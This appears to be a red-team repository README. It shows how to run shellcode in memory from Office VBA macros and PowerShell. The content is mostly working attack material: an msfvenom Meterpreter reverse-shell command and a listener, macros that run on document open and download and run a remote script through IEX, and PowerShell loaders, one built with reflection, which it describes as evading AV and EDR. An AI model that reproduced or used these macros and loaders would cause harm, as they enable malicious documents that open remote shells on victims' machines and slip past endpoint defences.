
### Shellcode Execution via VBA Macro and PowerShell Reflection
This repository demonstrates various in-memory shellcode execution techniques using VBA macros, PowerShell, and dynamic API resolution. These methods are often used for red team operations, malware simulation, and AV evasion.

The payload used in all examples can be generated using any C2 server or shellcode generator such as msfvenom.

Using any C2 serverto create shell code like metasploit 

1. Create shell code
    ```bash
       msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.2.142 LPORT=4444 -f powershell
    ```
2. Start listener
   ```bash
      msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.2.142; set LPORT 4444; exploit" 
   ```
3. Download and execute the powershell code
    via Macro or powershell directly  
    ```powershell
     IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.2.142/run.ps1')
    ```

#### VBA Shellcode Execution; shellcode embeded

```visual-basic
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, ...) ' Truncated for display

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

---

#### VBA Loader for PowerShell Script
**PowerShell-Based Shellcode Runner in VBA Macro**
1. Macro
  ```visual-basic
    Sub MyMacro()
        Dim str As String
        str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
        Shell str, vbHide
    End Sub
    
    Sub Document_Open()
        MyMacro
    End Sub
    
    Sub AutoOpen()
        MyMacro
    End Sub
  ```
  This macro executes a PowerShell command that downloads run.ps1 from a remote server and runs it in memory via IEX.
2. hosted powershell script:  run.ps1
  ```powershell
    # Load kernel32.dll functions for memory allocation and threading
    $Kernel32 = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class Kernel32 {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            
        [DllImport("kernel32", CharSet=CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
    "@
    
    Add-Type $Kernel32
    
    # Replace with your own shellcode (e.g., msfvenom payload)
    [Byte[]] $buf = 0xfc,0xe8,... # Truncated for brevity
    
    # Allocate memory for the shellcode
    $size = $buf.Length
    [IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)
    
    # Copy shellcode into allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    
    # Create a thread to execute shellcode
    $thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
    
    # Wait for thread execution to finish
    [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")  
  ```
  +  Uses Add-Type to declare VirtualAlloc, CreateThread, WaitForSingleObject
  +  Allocates memory, injects shellcode, and starts a new thread
  +  🧾 What it does:
      Defines required Win32 APIs using C# via Add-Type, then:

      + Allocates memory
      
      + Copies shellcode
      
      + Executes it with CreateThread
      
      + Waits for completion with WaitForSingleObject

  +  AV Evasion:
      Because the script compiles C# code in memory and never drops anything to disk, it avoids signature-based detection. Also avoids suspicious function names by resolving them dynamically.
---

### Reflection Shellcode Runner in PowerShell

1. Macro Loader 
  ```visual-basic
    Sub MyMacro()
        Dim str As String
        str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
        Shell str, vbHide
    End Sub
    
    Sub Document_Open()
        MyMacro
    End Sub
    
    Sub AutoOpen()
        MyMacro
    End Sub  
  ```
2. PowerShell code 
  ```powershell
    # ----------------------------
    # 1. Dynamically Resolve Win32 APIs
    # ----------------------------
    function LookupFunc {
        Param ($moduleName, $functionName)
    
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object {
                $_.GlobalAssemblyCache -and
                $_.Location.Split('\\')[-1] -eq 'System.dll'
            }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
        $getProcAddress = $assem.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' }
        $getModuleHandle = $assem.GetMethod('GetModuleHandle')
    
        return $getProcAddress[0].Invoke($null, @($getModuleHandle.Invoke($null, @($moduleName)), $functionName))
    }
    
    # ----------------------------
    # 2. Create a Delegate Type at Runtime
    # ----------------------------
    function getDelegateType {
        Param (
            [Type[]] $funcSig,
            [Type] $returnType = [Void]
        )
    
        $assemblyName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $domain = [AppDomain]::CurrentDomain
        $assemblyBuilder = $domain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    
        $constructorBuilder = $typeBuilder.DefineConstructor(
            'RTSpecialName, HideBySig, Public',
            [System.Reflection.CallingConventions]::Standard,
            $funcSig
        )
        $constructorBuilder.SetImplementationFlags('Runtime, Managed')
    
        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            'Public, HideBySig, NewSlot, Virtual',
            $returnType,
            $funcSig
        )
        $methodBuilder.SetImplementationFlags('Runtime, Managed')
    
        return $typeBuilder.CreateType()
    }
    
    # ----------------------------
    # 3. Allocate Memory for Shellcode
    # ----------------------------
    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAlloc),
        (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    # 0x1000 = 4096 bytes (adjust for shellcode size)
    # 0x3000 = MEM_COMMIT | MEM_RESERVE
    # 0x40 = PAGE_EXECUTE_READWRITE
    $mem = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    
    # ----------------------------
    # 4. Shellcode Payload (Example: MessageBox Shellcode)
    # Replace this with actual payload (e.g., msfvenom shellcode)
    # ----------------------------
    [Byte[]] $buf = @(0x90,0x90,0x90,0xcc)  # Replace with real shellcode
    
    # Copy to allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
    
    # ----------------------------
    # 5. CreateThread to Execute Shellcode
    # ----------------------------
    $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateThread),
        (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )
    
    $threadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    # ----------------------------
    # 6. Wait for Shellcode to Finish
    # ----------------------------
    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WaitForSingleObject),
        (getDelegateType @([IntPtr], [Int32]) ([Int]))
    )
    
    $WaitForSingleObject.Invoke($threadHandle, 0xFFFFFFFF)
  ```
  🧾 What it does:
      This is the most advanced PowerShell loader. It:
  
  1. Dynamically looks up function pointers (VirtualAlloc, CreateThread, WaitForSingleObject) without using Add-Type.
  
  2. Creates delegates at runtime to avoid static detection.
  
  3. Allocates memory, injects shellcode, runs it, and waits for termination.
  
  🎯 AV Evasion:
  
  + No DLL imports
  
  + No Add-Type
  
  + Uses reflection and dynamic assembly building
  
  + Executes fully in memory (no temp files or compilation on disk)
  
  This technique is highly evasive against modern AV and EDR solutions.


